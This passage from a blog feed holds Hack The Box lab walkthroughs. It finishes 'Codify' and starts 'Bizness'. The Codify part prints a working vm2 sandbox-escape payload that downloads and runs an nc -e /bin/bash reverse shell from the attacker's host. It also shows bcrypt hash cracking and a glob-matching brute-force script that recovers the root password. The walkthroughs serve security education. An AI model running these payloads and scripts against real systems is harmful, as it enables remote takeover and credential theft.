</code></pre></div></div> <p>The command has the following components:</p> <ul> <li><code class="language-plaintext highlighter-rouge">#!/bin/bash</code> is the shebang line that tells the system this is a Bash script.</li> <li><code class="language-plaintext highlighter-rouge">nc</code> is the Netcat command.</li> <li><code class="language-plaintext highlighter-rouge">10.10.14.15</code> is the IP address where your Netcat listener is running.</li> <li><code class="language-plaintext highlighter-rouge">4321</code> is the port on which your Netcat listener is listening.</li> <li><code class="language-plaintext highlighter-rouge">-e /bin/bash</code> tells Netcat to execute the <code class="language-plaintext highlighter-rouge">/bin/bash</code> shell upon connecting. This will give the listener shell access to the system running the script.</li> </ul> <p>The file is saved as <code class="language-plaintext highlighter-rouge">shell.sh</code>.</p> <p>The file can then be served with a simple webserver:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">8080</span>
</code></pre></div></div> <p>The target can then be manipulated into fetching the shell by adding <code class="language-plaintext highlighter-rouge">curl http://10.10.14.15:8080/shell.sh -o shell</code> to the <code class="language-plaintext highlighter-rouge">execSync()</code> function in PoC like so:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.14.15:8080/shell.sh -o shell');
}
`</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
</code></pre></div></div> <p>The python webserver confirms the file was successfully fetched:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">└──╼</span> <span class="p">[</span><span class="err">★</span><span class="p">]</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">8080</span>
<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span> <span class="n">port</span> <span class="mi">8080</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="p">)</span> <span class="bp">...</span>
<span class="mf">10.129</span><span class="p">.</span><span class="mf">6.167</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">24</span><span class="o">/</span><span class="n">Jan</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">05</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="sh">"</span><span class="s">GET /shell.sh HTTP/1.1</span><span class="sh">"</span> <span class="mi">200</span> <span class="o">-</span>
</code></pre></div></div> <h3 id="exploitation-1">Exploitation</h3> <p>The next step is to make the file executable by sending <code class="language-plaintext highlighter-rouge">chmod +x shell</code> in the <code class="language-plaintext highlighter-rouge">execSync()</code> function.</p> <p>Then, after starting a <code class="language-plaintext highlighter-rouge">netcat</code>listener, the shell can be executed by sending <code class="language-plaintext highlighter-rouge">bash -x shell</code> to the target:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('bash -x shell');
}
`</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
</code></pre></div></div> <p>The listener successfully captures the reverse shell:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4321
Ncat: Version 7.93 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
Ncat: Connection from 10.129.6.167.
Ncat: Connection from 10.129.6.167:44946.
sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
svc
$ 
</span></code></pre></div></div> <h3 id="upgrading-the-shell">Upgrading the shell</h3> <p>The shell can then be upgraded for interactivity using:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">"</span><span class="s">import pty;pty.spawn(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>

<span class="n">svc</span><span class="nd">@codify</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span> 

</code></pre></div></div> <h2 id="lateral-movement">Lateral movement</h2> <p>Exploring the site’s <code class="language-plaintext highlighter-rouge">/www</code> directory in the root <code class="language-plaintext highlighter-rouge">/var</code> directory finds a <code class="language-plaintext highlighter-rouge">tickets.db</code> file.</p> <p>Catting this file finds a hash for the user <code class="language-plaintext highlighter-rouge">joshua</code>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@codify:/var/www/contact<span class="nv">$ </span><span class="nb">cat </span>tickets.db
<span class="nb">cat </span>tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets <span class="o">(</span><span class="nb">id </span>INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT<span class="o">)</span>P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence<span class="o">(</span>name,seq<span class="o">)</span>��	tableusersusersCREATE TABLE <span class="nb">users</span> <span class="o">(</span>
        <span class="nb">id </span>INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua<span class="nv">$2a$12$SOn8Pf6z8fO</span>/nVsNbAAequ/&lt;REDACTED&gt;/p/Zw2
��
����ua  <span class="nb">users
             </span>ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to <span class="nb">set </span>this up locally? Like instead of coming to this site, can I download this and <span class="nb">set </span>it up <span class="k">in </span>my own computer? A feature like that would be nice.open� <span class="p">;</span>�wTom HanksNeed networking modulesI think it would be better <span class="k">if </span>you can implement a way to handle network-based stuff. Would <span class="nb">help </span>me out a lot. Thanks!opensvc@codify:/var/www/contact<span class="nv">$ </span>
</code></pre></div></div> <p>The hash appears to be a bcrypt hash.</p> <blockquote> <p><em>Bcrypt hashes are recognisable by their format, which usually starts with <code class="language-plaintext highlighter-rouge">$2a$</code>, <code class="language-plaintext highlighter-rouge">$2b$</code>, <code class="language-plaintext highlighter-rouge">$2x$</code>, or <code class="language-plaintext highlighter-rouge">$2y$</code> followed by a cost parameter (like <code class="language-plaintext highlighter-rouge">$12$</code> in your hash), and then the salt and hash value.</em></p> </blockquote> <p>The hash can be formatted for hashcat by dropping the username and adding it to a file (or passing it directly to the command).</p> <p>In Hashcat, the mode to use for cracking bcrypt hashes is <code class="language-plaintext highlighter-rouge">3200</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 3200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...

OpenCL API <span class="o">(</span>OpenCL 1.2 LINUX<span class="o">)</span> - Platform <span class="c">#1 [Intel(R) Corporation]</span>
<span class="o">==================================================================</span>
<span class="k">*</span> Device <span class="c">#1: AMD EPYC 7543 32-Core Processor, 7855/7919 MB (1979 MB allocatable), 4MCU</span>

OpenCL API <span class="o">(</span>OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#2 [The pocl project]</span>
<span class="o">=============================================================================================================================</span>
<span class="k">*</span> Device <span class="c">#2: pthread-AMD EPYC 7543 32-Core Processor, skipped</span>

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests<span class="p">;</span> 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
<span class="k">*</span> Zero-Byte
<span class="k">*</span> Single-Hash
<span class="k">*</span> Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required <span class="k">for </span>this attack: 65 MB

Dictionary cache built:
<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
<span class="k">*</span> Passwords.: 14344392
<span class="k">*</span> Bytes.....: 139921507
<span class="k">*</span> Keyspace..: 14344385
<span class="k">*</span> Runtime...: 1 sec

</code></pre></div></div> <p>The hash cracks</p> <p><img src="/assets/img/2024-codify/20240125-codify-hash.png" alt="20240125-codify-hash.png" class="auto-resize"/></p> <p>With the acquired password, SSH can be used to authenticate to the target as the user <strong>joshua.</strong></p> <p>And the user flag is obtained.</p> <div class="language-ssh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">└──╼</span> <span class="err">[★]$</span> <span class="k">ssh</span> joshua@10.129.6.167
<span class="k">joshua</span>@codify:~<span class="err">$</span> ls
<span class="k">user</span>.txt
<span class="k">joshua</span>@codify:~<span class="err">$</span> cat user.txt 
&lt;REDACTED&gt;

</code></pre></div></div> <h2 id="privilege-escalation">Privilege escalation</h2> <p>A helpful check for privilege escalation is to review sudo permissions.</p> <p>Using <code class="language-plaintext highlighter-rouge">sudo -l</code> it can be seen that the user has sudo rights over the <code class="language-plaintext highlighter-rouge">/opt/scripts/mysql-backup.sh</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joshua@codify:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>joshua: 
Matching Defaults entries <span class="k">for </span>joshua on codify:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User joshua may run the following commands on codify:
    <span class="o">(</span>root<span class="o">)</span> /opt/scripts/mysql-backup.sh

</code></pre></div></div> <p>As the name suggests, the script is designed to back up MySQL databases.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nv">DB_USER</span><span class="o">=</span><span class="s2">"root"</span>
<span class="nv">DB_PASS</span><span class="o">=</span><span class="si">$(</span>/usr/bin/cat /root/.creds<span class="si">)</span>
<span class="nv">BACKUP_DIR</span><span class="o">=</span><span class="s2">"/var/backups/mysql"</span>

<span class="nb">read</span> <span class="nt">-s</span> <span class="nt">-p</span> <span class="s2">"Enter MySQL password for </span><span class="nv">$DB_USER</span><span class="s2">: "</span> USER_PASS
/usr/bin/echo

<span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="nv">$USER_PASS</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
        /usr/bin/echo <span class="s2">"Password confirmed!"</span>
<span class="k">else</span>
        /usr/bin/echo <span class="s2">"Password confirmation failed!"</span>
        <span class="nb">exit </span>1
<span class="k">fi</span>

/usr/bin/mkdir <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>

<span class="nv">databases</span><span class="o">=</span><span class="si">$(</span>/usr/bin/mysql <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$DB_USER</span><span class="s2">"</span> <span class="nt">-h</span> 0.0.0.0 <span class="nt">-P</span> 3306 <span class="nt">-p</span><span class="s2">"</span><span class="nv">$DB_PASS</span><span class="s2">"</span> <span class="nt">-e</span> <span class="s2">"SHOW DATABASES;"</span> | /usr/bin/grep <span class="nt">-Ev</span> <span class="s2">"(Database|information_schema|performance_schema)"</span><span class="si">)</span>

<span class="k">for </span>db <span class="k">in</span> <span class="nv">$databases</span><span class="p">;</span> <span class="k">do</span>
    /usr/bin/echo <span class="s2">"Backing up database: </span><span class="nv">$db</span><span class="s2">"</span>
    /usr/bin/mysqldump <span class="nt">--force</span> <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$DB_USER</span><span class="s2">"</span> <span class="nt">-h</span> 0.0.0.0 <span class="nt">-P</span> 3306 <span class="nt">-p</span><span class="s2">"</span><span class="nv">$DB_PASS</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$db</span><span class="s2">"</span> | /usr/bin/gzip <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">/</span><span class="nv">$db</span><span class="s2">.sql.gz"</span>
<span class="k">done</span>

/usr/bin/echo <span class="s2">"All databases backed up successfully!"</span>
/usr/bin/echo <span class="s2">"Changing the permissions"</span>
/usr/bin/chown root:sys-adm <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
/usr/bin/chmod 774 <span class="nt">-R</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
/usr/bin/echo <span class="s1">'Done!'</span>

</code></pre></div></div> <p>The script does the following:</p> <ol> <li><strong>Setting Variables:</strong> <ul> <li><code class="language-plaintext highlighter-rouge">DB_USER="root"</code>: Defines the database username, in this case, <code class="language-plaintext highlighter-rouge">root</code>.</li> <li><code class="language-plaintext highlighter-rouge">DB_PASS=$(/usr/bin/cat /root/.creds)</code>: Retrieves the MySQL root user’s password from a file located at <code class="language-plaintext highlighter-rouge">/root/.creds</code>.</li> </ul> </li> <li><strong>Password Confirmation:</strong> <ul> <li>The script prompts the user to enter the MySQL password for the root user. This is done securely (without echoing the input) using <code class="language-plaintext highlighter-rouge">read -s -p</code>.</li> <li>It then checks if the entered password (<code class="language-plaintext highlighter-rouge">USER_PASS</code>) matches the one stored in <code class="language-plaintext highlighter-rouge">/root/.creds</code> (<code class="language-plaintext highlighter-rouge">DB_PASS</code>). If they don’t match, the script prints an error message and exits.</li> </ul> </li> <li><strong>Creating Backup Directory:</strong> <ul> <li>The script ensures that the backup directory (<code class="language-plaintext highlighter-rouge">/var/backups/mysql</code>) exists, creating it if necessary with <code class="language-plaintext highlighter-rouge">mkdir -p</code>.</li> </ul> </li> <li><strong>Retrieving Database Names:</strong> <ul> <li>It retrieves a list of all databases (excluding <code class="language-plaintext highlighter-rouge">information_schema</code>, <code class="language-plaintext highlighter-rouge">performance_schema</code>, and the <code class="language-plaintext highlighter-rouge">Database</code> header) using a MySQL command. The list of databases is stored in the variable <code class="language-plaintext highlighter-rouge">databases</code>.</li> </ul> </li> <li><strong>Backing Up Each Database:</strong> <ul> <li>The script loops through each database in the <code class="language-plaintext highlighter-rouge">databases</code> variable.</li> <li>For each database (<code class="language-plaintext highlighter-rouge">db</code>), it performs a backup using <code class="language-plaintext highlighter-rouge">mysqldump</code> and compresses the output to a <code class="language-plaintext highlighter-rouge">.sql.gz</code> file in the backup directory. Each backup file is named after the database.</li> </ul> </li> <li><strong>Post-backup Steps:</strong> <ul> <li>After backing up all the databases, the script prints a success message.</li> <li>It then changes the ownership of the backup directory to the <code class="language-plaintext highlighter-rouge">root</code> user and <code class="language-plaintext highlighter-rouge">sys-adm</code> group.</li> <li>The script modifies the permissions of the backup directory and its contents to <code class="language-plaintext highlighter-rouge">774</code> (read/write/execute for owner and group, read for others).</li> <li>Finally, it prints ‘Done!’ to indicate completion.</li> </ul> </li> </ol> <p>In summary, this script is a utility for backing up all MySQL databases on a server. It first confirms that the user running the script knows the MySQL root password, then proceeds to back up each database to a specified directory, securing the backups with appropriate permissions and ownership.</p> <blockquote> <p><em>After a fair bit of research, I came across <a href="https://blnknlights.github.io/htb/machines/easy/codify/codify.html">this great write up</a> that put me onto a track without just giving me the answer.</em></p> </blockquote> <h3 id="shellcheck">Shellcheck</h3> <p>Using a utility called <code class="language-plaintext highlighter-rouge">shellcheck</code>, the <code class="language-plaintext highlighter-rouge">mysql-backup.sh</code> can be assessed:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>shellcheck shell.sh

In shell.sh line 6:
<span class="nb">read</span> <span class="nt">-s</span> <span class="nt">-p</span> <span class="s2">"Enter MySQL password for </span><span class="nv">$DB_USER</span><span class="s2">: "</span> USER_PASS
^--^ SC2162: <span class="nb">read </span>without <span class="nt">-r</span> will mangle backslashes.


In shell.sh line 9:
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="nv">$USER_PASS</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
                  ^--------^ SC2053: Quote the right-hand side of <span class="o">==</span> <span class="k">in</span> <span class="o">[[</span> <span class="o">]]</span> to prevent glob matching.

For more information:
  https://www.shellcheck.net/wiki/SC2053 <span class="nt">--</span> Quote the right-hand side of <span class="o">==</span> i...
  https://www.shellcheck.net/wiki/SC2162 <span class="nt">--</span> <span class="nb">read </span>without <span class="nt">-r</span> will mangle backs...

</code></pre></div></div> <p>As shown, it gives the warning that:</p> <blockquote> <p>“<em>Quote the right-hand side of == in [[ ]] to prevent glob matching.</em>”</p> </blockquote> <h3 id="what-is-glob-matching">What is glob matching</h3> <p>Glob matching, in the context of shell scripts, refers to a feature where certain characters (like <code class="language-plaintext highlighter-rouge">*</code>, <code class="language-plaintext highlighter-rouge">?</code>, <code class="language-plaintext highlighter-rouge">[</code>, and <code class="language-plaintext highlighter-rouge">]</code>) are used as wildcards to match filenames or strings. This is commonly used in file operations but can also apply to string comparisons in conditional statements.</p> <p>In the script, <code class="language-plaintext highlighter-rouge">[[ $DB_PASS == $USER_PASS ]]</code> doesn’t quote <code class="language-plaintext highlighter-rouge">$USER_PASS</code>, which means the shell tries to perform glob matching instead of matching the literal string with the value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code>. This means:</p> <ul> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains a <code class="language-plaintext highlighter-rouge">*</code>, it could match any string of characters.</li> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains a <code class="language-plaintext highlighter-rouge">?</code>, it could match any single character.</li> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains <code class="language-plaintext highlighter-rouge">[</code> and <code class="language-plaintext highlighter-rouge">]</code>, it could match any characters inside the brackets.</li> </ul> <p>This behaviour can lead to unexpected results or security vulnerabilities. For instance, if <code class="language-plaintext highlighter-rouge">$USER_PASS</code> somehow contains <code class="language-plaintext highlighter-rouge">*</code>, the condition might unexpectedly evaluate to true.</p> <p>To prevent glob matching and ensure the script is comparing the actual string value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code> with <code class="language-plaintext highlighter-rouge">$DB_PASS</code>, you should quote <code class="language-plaintext highlighter-rouge">$USER_PASS</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="s2">"</span><span class="nv">$USER_PASS</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    ...
<span class="k">fi</span>

</code></pre></div></div> <p>This change ensures that the value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code> is taken literally, without any glob matching.</p> <h3 id="brute-forcing-the-password">Brute-forcing the password</h3> <p>With the help of ChatGPT, the following script can brute force the password by glob matching the next character iteratively.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">subprocess</span>

<span class="k">def</span> <span class="nf">attempt_password</span><span class="p">(</span><span class="n">current_password</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Execute the password check command
</span>        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">echo </span><span class="sh">'</span><span class="si">{</span><span class="n">current_password</span><span class="si">}</span><span class="s">*</span><span class="sh">'</span><span class="s"> | sudo /opt/scripts/mysql-backup.sh</span><span class="sh">"</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">check_output</span><span class="p">(</span>
            <span class="n">command</span><span class="p">,</span>
            <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
            <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">,</span>
            <span class="n">text</span><span class="o">=</span><span class="bp">True</span>
        <span class="p">)</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">Password confirmed!</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">output</span>
    <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="n">all_chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
<span class="n">password</span> <span class="o">=</span> <span class="sh">""</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">all_chars</span><span class="p">:</span>
        <span class="k">if</span> <span class="nf">attempt_password</span><span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">char</span><span class="p">):</span>
            <span class="n">password</span> <span class="o">+=</span> <span class="n">char</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Current Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">break</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="c1"># Exit the loop if no additional character matches
</span>        <span class="k">break</span>

<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Final Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span> <span class="k">if</span> <span class="n">password</span> <span class="k">else</span> <span class="sh">"</span><span class="s">Password not found.</span><span class="sh">"</span><span class="p">)</span>

</code></pre></div></div> <p>With the globbed password, and switching to the <strong>root</strong> user, the final flag is captured.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joshua@codify:~<span class="nv">$ </span>su root
Password: 
root@codify:/home/joshua# <span class="nb">cd</span> ~
root@codify:~# <span class="nb">ls
</span>root.txt  scripts
root@codify:~# <span class="nb">cat </span>root.txt 
&lt;REDACTED&gt;
root@codify:~# 

</code></pre></div></div>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="arbitrary-code-execution"/><category term="ace"/><category term="remote-code-exeuction"/><category term="rce"/><category term="glob"/><category term="globbing"/><category term="secure-coding"/><category term="insecure-coding"/><category term="node.js"/><summary type="html"><![CDATA[Codify - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">Bizness</title><link href="https://emdeh.github.io/blog/2024/bizness-walkthrough/" rel="alternate" type="text/html" title="Bizness"/><published>2024-01-23T14:14:00+00:00</published><updated>2024-01-23T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/bizness-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/bizness-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Bizness is an easy box with a relatively convoluted privilege escalation that is not-so-easy. It involves enumerating a web application running an open-source enterprise resource planning (ERP) system called <strong>Apache OFBiz</strong>. The ERP has an <strong>authentication bypass</strong> vulnerability that allows for a subsequent an <strong>Server Side Request Forgery (SSRF)</strong> vulnerability to be exploited to obtain a reverse shell.</p> <p>From there the system is enumerated manually and with the help of Linpeas to locate a custom-salted hash. Once the hash is cracked, it is just a matter of switching to the root user to obtain the final flag.</p> <h2 id="methods">Methods</h2> <h3 id="authentication-bypass">Authentication bypass</h3> <p>An authentication bypass vulnerability is a security flaw that allows an attacker to access a system, application, or network without going through the standard authentication process. This type of vulnerability effectively undermines the security mechanisms that verify the identity of a user or entity, granting unauthorized access.</p> <p>Key aspects of an authentication bypass vulnerability include:</p> <ol> <li> <p><strong>Bypassing Security Checks:</strong> The attacker finds a way to circumvent or exploit weaknesses in the authentication process, such as exploiting code flaws, misconfigurations, or logic errors.</p> </li> <li> <p><strong>Unauthorised Access:</strong> As a result, the attacker gains access to restricted areas of the system or application, often with the same privileges as a legitimate user.</p> </li> <li> <p><strong>Potential Impact:</strong> This can lead to various security issues, such as data breaches, privilege escalation, and system compromise.</p> </li> <li> <p><strong>Common Causes:</strong> Causes might include inadequate input validation, insecure direct object references, or flawed session management.</p> </li> </ol> <h3 id="server-side-request-forgery-ssrf">Server Side Request Forgery (SSRF)</h3> <p>Server-Side Request Forgery (SSRF) is a type of web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing. This vulnerability occurs when a web application fetches a remote resource without validating the user-supplied URL, allowing an attacker to manipulate the requests made by the server.</p> <p>In an SSRF attack, the attacker can:</p> <ol> <li> <p><strong>Access Services Inaccessible to the Public:</strong> The attacker can target internal systems behind firewalls that are normally inaccessible from the external network, including services running on the server itself (like databases or internal web applications).</p> </li> <li> <p><strong>Manipulate Requests:</strong> The attacker might manipulate the server to send requests to unintended locations, possibly leading to information disclosure, privilege escalation, or other malicious activities.</p> </li> <li> <p><strong>Conduct Port Scanning:</strong> SSRF can be used to scan ports and find services running on servers within the organization’s internal network.</p> </li> <li> <p><strong>Exploit Vulnerable Services and APIs:</strong> If the internal systems have vulnerabilities, SSRF can provide a pathway for exploiting these vulnerabilities.</p> </li> </ol> <p>Mitigating SSRF typically involves validating and sanitizing all user input, especially URLs, implementing strict access controls, and using allowlists for external services that the application can interact with.</p> <p>SSRF is a significant security concern in modern web applications, especially those that interact with complex systems and external services.</p> <h2 id="tools">Tools</h2> <ul> <li><strong>Nmap</strong> for initial network enumeration.</li> <li><strong><a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">CVE-2023-51467 POC</a>)</strong> for vulnerability scanning and initial access.</li> <li><strong><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">Linpeas</a></strong> for system enumeration.</li> <li><strong><a href="https://medium.com/@mastercode112/htb-bizness-easy-writeup-bacce3ba0969">Custom python script</a></strong> to convert custom SHA hash.</li> </ul> <h2 id="tactics">Tactics</h2> <ul> <li><strong>Establishing persistence</strong> via rogue SSH keys.</li> </ul> <hr/> <h1 id="enumeration">Enumeration</h1> <p>As always, enumeration begins with an Nmap scan.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.8.141 | <span class="nb">tee </span>nmap-output.txt    
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>10.129.8.141
Host is up <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 <span class="o">(</span>RSA<span class="o">)</span>
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
|_http-title: Did not follow redirect to https://bizness.htb/
